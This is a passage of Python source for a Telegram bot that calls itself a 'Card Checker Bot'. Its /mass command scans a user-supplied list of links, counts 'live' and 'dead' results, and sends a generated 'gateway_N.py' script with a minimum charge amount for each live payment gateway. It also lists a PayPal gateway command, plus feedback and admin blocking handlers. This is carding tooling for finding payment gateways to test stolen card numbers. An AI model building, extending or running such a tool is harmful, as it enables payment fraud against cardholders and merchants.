        safe_edit_message(massege.chat.id, ko.message_id, f"❌ Error: {str(e)[:100]}")


@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    save_user(message.from_user.id)
    if is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]
        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return
        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
🛑 /stop to stop""")
        if not status_msg: return

        def update_status():
            last_text = ""
            while True:
                time.sleep(8)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False): break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        cur_url = processing_status[user_id]['current_url']
                        cur_res = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{cur_url[:60] if cur_url else '...'}</code>
Respons : <code>{cur_res[:60] if cur_res else '...'}</code>
━━━━━━━━━━━━━━━━━━
🛑 /stop to stop"""
                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except: pass
                except: pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()
        time.sleep(1)
        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False): break
            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'
            result = check_single_link(link)
            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']
                    try:
                        code = generate_gateway_code(result['respons'], result['link'])
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result['respons']}</code>
💰 <b>Min:</b> <code>${result.get('amount', '1.00')}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30""")
                        try: os.remove(file_name)
                        except: pass
                    except Exception as e: print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
            time.sleep(1)
        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']
        updater.join(timeout=10)
        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except: safe_send_message(chat_id, final_text)
        if user_id in processing_status:
            del processing_status[user_id]
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")


# ============================================================
#  START / FEEDBACK / ADMIN
# ============================================================
@bot.message_handler(commands=["start"])
def start(message):
    save_user(message.from_user.id)
    if is_blocked(message.from_user.id):
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"
    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    safe_send_message(message.chat.id, IU, reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    Atty.add(types.InlineKeyboardButton("Back", callback_data="start"))
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
            text=f'Welcome {userr} Send your message.', parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    text = message.text or "(non-text message)"
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id, None)


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    text = message.text or "(non-text message)"
    safe_send_message(user_id, f"Admin response:\n\n{text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id, None)


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'[⚡] Welcome {userr}\n[⚡] @{username}\n[⚡] ID: <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    FRA.add(types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr'))
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")


@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        with open('blockusers.txt', 'r') as file:
            blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
        if uid in blocked:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is already blocked.")
            return
        with open('blockusers.txt', 'a') as file:
            file.write(f"{uid}\n")
        safe_send_message(message.chat.id, f"✅ User ID {uid} blocked.")
        try:
            safe_send_message(int(uid), "🚫 You have been blocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        uid = message.text.split()[1].strip()
        if not uid.isdigit():
            safe_send_message(message.chat.id, "❌ User ID must be numeric.")
            return
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        found = any(line.strip() == uid for line in lines)
        if not found:
            safe_send_message(message.chat.id, f"⚠️ User ID {uid} is not blocked.")
            return
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != uid:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {uid} unblocked.")
        try:
            safe_send_message(int(uid), "✅ You have been unblocked by the admin.")
        except: pass
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


@bot.message_handler(commands=['blocklist'])
def block_list(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    with open('blockusers.txt', 'r') as file:
        blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
    if not blocked:
        safe_send_message(message.chat.id, "📋 Block list is empty.")
        return
    text = "📋 <b>Blocked Users:</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for i, uid in enumerate(blocked, 1):
        text += f"{i}. <code>{uid}</code>\n"
    text += f"━━━━━━━━━━━━━━━━━━━━\n📌 Total: <b>{len(blocked)}</b>"
    safe_send_message(message.chat.id, text)


print('✅ Bot is running...')
try:
    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
